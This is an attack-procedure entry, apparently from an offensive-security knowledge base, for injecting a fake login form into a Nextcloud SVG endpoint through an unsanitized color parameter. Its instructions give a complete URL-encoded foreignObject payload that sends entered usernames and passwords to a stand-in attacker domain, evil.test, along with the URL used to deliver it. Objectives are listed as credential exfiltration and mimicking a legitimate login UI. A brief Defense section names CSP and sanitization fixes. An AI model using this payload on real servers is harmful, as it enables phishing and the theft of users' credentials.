---
tags:
  - phishing
  - markup-injection
  - svg
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Phishing]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 46707434-7006-48ce-b0a6-e24b727a7aea
created_at: '2025-12-14T03:47:18.607Z'
updated_at: '2025-12-14T03:47:18.607Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Phishing]]'
---
# Inject-Phishing-Form-via-SVG-Markup

## Summary

Injects a phishing login form into the Nextcloud SVG endpoint using foreignObject to embed HTML, enabling credential capture via submission to an attacker domain.

## Description

Exploiting the same unsanitized color parameter, this injects <foreignObject> with XHTML form. CSP blocks JS but not form submission (missing form-action directive), allowing phishing. Style with unsafe-inline CSS and embed in iframes for deception.

## Requirements

1. Attacker-controlled domain (e.g., evil.test)
2. Encoded HTML payload
3. Victim interaction with form

## Defense

Defensive measures and detection strategies:

- Add form-action to CSP to restrict submissions
- Sanitize SVG inputs to block foreignObject
- User training on suspicious forms

## Objectives

1. Inject functional HTML form
2. Enable credential exfiltration
3. Mimic legitimate login UI

## Instructions

### Step 1: Craft Phishing Payload

**Context**: Encode form to inject via color param.

Payload: color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22

> Use // for protocol-relative to match victim site.

### Step 2: Deliver Payload

**Context**: Trigger rendering of phishing form.

Navigate: https://server.test/nextcloud/index.php/svg/core/logo/logo?color=fff%22/%3E%3CforeignObject%20class=%22node%22%20x=%220%22%20y=%220%22%20width=%22600%22%20height=%22600%22%3E%3Cdiv%20xmlns=%22http://www.w3.org/1999/xhtml%22%3E%3Cp%3ELogin%3C/p%3E%3Cform%20action=%22//evil.test%22%3E%3Cinput%20placeholder=%22Username%22%20type=%22text%22/%3E%3Cbr/%3E%20%3Cinput%20placeholder=%22Password%22%20type=%22text%22%20/%3E%3Cbr/%3E%3Cinput%20type=%22submit%22%20value=%22Login%22%20/%3E%3C/form%3E%3C/div%3E%3C/foreignObject%3E%3Ccircle%20alt=%22

> Form appears in SVG.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Phishing]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Web-Browser]]

## Tags

- [[Phishing]]
- [[markup-injection]]
- [[svg]]
